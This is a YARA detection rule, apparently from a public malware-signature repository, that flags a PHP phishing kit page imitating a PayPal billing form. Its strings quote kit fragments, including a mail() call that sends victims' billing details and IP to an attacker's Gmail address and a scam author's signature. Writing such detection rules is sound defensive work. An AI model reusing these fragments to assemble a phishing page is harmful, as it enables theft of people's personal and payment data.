rule INFORMATION {
  meta:
    description = "case127 - file INFORMATION.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara"
    date        = "2018-06-08"
    hash1       = "295818c6e3fcb77d4e04407fc861bc18a6df278f550070b16915da35c3f3bcc9"

  strings:
    $s1  = "mail(\"rezult1996@gmail.com\",'PP Billing Address : '.$ip,$message);" fullword ascii
    $s2  = "<form method=\"POST\" action=\"Congratulations.php\">" fullword ascii
    $s3  = "<i><?=$fname.' '.$lname ?><br /><?=$adds1 ?> <?php  if (strlen($adds2)>1) { echo \"<br />\".$adds2;} ?><br /><?=$c" fullword ascii
    $s4  = "<p>Veuillez &ecirc;tre s&ucirc;r que vos informations sont correctes:</p>" fullword ascii
    $s5  = "Date of birth:\".$dob_day.\"/\".$dob_month.\"/\".$dob_year.\"" fullword ascii
    $s6  = "/*////////////////////////////////////////////////////////////////////////////////////////////////////*/" fullword ascii
    $s7  = "<script src=\"javascript/jquery-1.11.2.min.js\"></script>" fullword ascii
    $s8  = "ity.\",\".$state.\" \".$zip ?><br /><?=$country ?><br /><a id=\"show\" href=\"#\">Edit</a></i><br />" fullword ascii
    $s9  = "<img src=\"images/cvn.jpg\" style=\"margin-left:-100;\" />" fullword ascii
    $s10 = "# Scam By R#5 | contact me on my email address Rush3@live.ru" fullword ascii
    $s11 = "$dob_month = $_POST[\"dob_month\"];" fullword ascii
    $s12 = "$dob_year = $_POST[\"dob_year\"];" fullword ascii
    $s13 = "$(\"#edyear\").css(\"border-color\",\"#ff3f3f\");" fullword ascii
    $s14 = "$(\"#edyear\").css(\"border-color\",\"#B3B3B3\");" fullword ascii
    $s15 = "$(\"#edmonth\").css(\"border-color\",\"#B3B3B3\");" fullword ascii
    $s16 = "$(\"#edmonth\").css(\"border-color\",\"#ff3f3f\");" fullword ascii
    $s17 = "Middle name:\".$mname.\"" fullword ascii
    $s18 = "<link rel=\"stylesheet\" href=\"css/normalize.css\" />" fullword ascii
    $s19 = "<link rel=\"stylesheet\" href=\"css/style.css\" />" fullword ascii
    $s20 = "<link rel=\"icon\" href=\"images/pp_favicon_x.ico\" />" fullword ascii

  condition:
    (uint16(0) == 0xbbef and
      filesize < 20KB and
      (8 of them)
    ) or (all of them)
}